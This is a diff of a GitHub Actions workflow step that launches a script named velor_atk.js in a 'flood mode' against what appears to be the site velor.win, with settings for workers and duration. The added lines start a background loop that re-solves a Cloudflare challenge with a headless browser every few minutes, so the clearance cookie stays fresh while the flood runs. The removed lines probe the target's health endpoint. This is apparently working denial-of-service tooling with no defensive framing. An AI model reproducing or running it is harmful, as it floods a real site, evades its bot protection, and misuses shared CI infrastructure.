@@ -75,15 +75,17 @@ jobs:
           ADDR=$(cat /tmp/addr.txt 2>/dev/null || true); [ -z "$ADDR" ] && ADDR="${{ env.ADDR }}"
           CK=$(cat ck/cf_cookie.txt 2>/dev/null || true); UA=$(cat ck/cf_ua.txt 2>/dev/null || true)
           echo "envcheck: cklen=${#CK} ualen=${#UA} addr=$ADDR"
+          mkdir -p ck ck/rs
+          cp -f ck/cf_cookie.txt ck/rs/cf_cookie.txt 2>/dev/null || true
+          ( while true; do sleep 240; (cd ck/rs && SOLVE_FAM=v6 SOLVE_PORT=9344 timeout 150 xvfb-run -a node "$GITHUB_WORKSPACE/solve.js" >/dev/null 2>&1) || true; [ -s ck/rs/cf_cookie.txt ] && cp -f ck/rs/cf_cookie.txt ck/cf_cookie.txt && cp -f ck/rs/cf_ua.txt ck/cf_ua.txt && echo "cookie refreshed in-flight"; done ) &
+          RS=$!
           export CF_COOKIE="$CK" CF_UA="$UA" LOCAL_IP="$ADDR"
-          node -e '
-          const https=require("https");
-          https.get({host:"velor.win",path:"/api/health",localAddress:process.env.LOCAL_IP,family:6,headers:{cookie:process.env.CF_COOKIE,"user-agent":process.env.CF_UA}},s=>{let b="";s.on("data",c=>b+=c);s.on("end",()=>{const t=(b.match(/<title>([^<]*)/)||[])[1]||"";console.log("NODE-PROBE code="+s.statusCode+" "+t);});}).on("error",e=>console.log("NODE-PROBE err="+e.message));
-          '
+          export CF_COOKIE_FILE="$PWD/ck/cf_cookie.txt" CF_UA_FILE="$PWD/ck/cf_ua.txt"
           T=$(( ${{ inputs.seconds || '1200' }} + 60 ))
-          echo "flood mode=${{ inputs.mode || 'h2trk' }} from $LOCAL_IP cap=${T}s"
+          echo "flood mode=${{ inputs.mode || 'h2trk' }} from $LOCAL_IP cap=${T}s (cookie-file live)"
           node velor_atk.js ${{ inputs.mode || 'h2trk' }} ${{ inputs.workers || '4' }} ${{ inputs.seconds || '1200' }} > live.log 2>&1 &
           HP=$!
           while kill -0 $HP 2>/dev/null && [ $SECONDS -lt $T ]; do sleep 20; tail -1 atk.out 2>/dev/null || true; done
           wait $HP 2>/dev/null || true
+          kill $RS 2>/dev/null || true
           echo "== final codes =="; grep -E 'sent=|first429' atk.out 2>/dev/null | tail -3; tail -2 atk.out 2>/dev/null
